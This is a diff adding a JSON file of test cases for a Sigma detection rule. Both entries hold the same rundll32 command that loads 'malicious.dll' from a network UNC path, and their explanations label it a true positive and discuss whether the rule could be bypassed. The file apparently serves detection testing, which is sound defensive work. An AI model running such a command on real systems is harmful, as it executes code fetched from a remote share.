@@ -1,0 +1,10 @@
+[
+  {
+    "output": "rundll32.exe \\\\192.168.1.100\\share\\malicious.dll,EntryPoint",
+    "explanation": "This command uses a UNC path to execute rundll32.exe, which matches the Sigma rule's detection criteria. It serves as a true-positive test case."
+  },
+  {
+    "output": "rundll32.exe \\\\192.168.1.100\\share\\malicious.dll,EntryPoint",
+    "explanation": "Bypass attempt not applicable. The Sigma rule is based on the presence of a UNC path in the command line, which is explicitly included in this command. Mutation techniques cannot remove or obscure the UNC path without breaking the test case."
+  }
+]
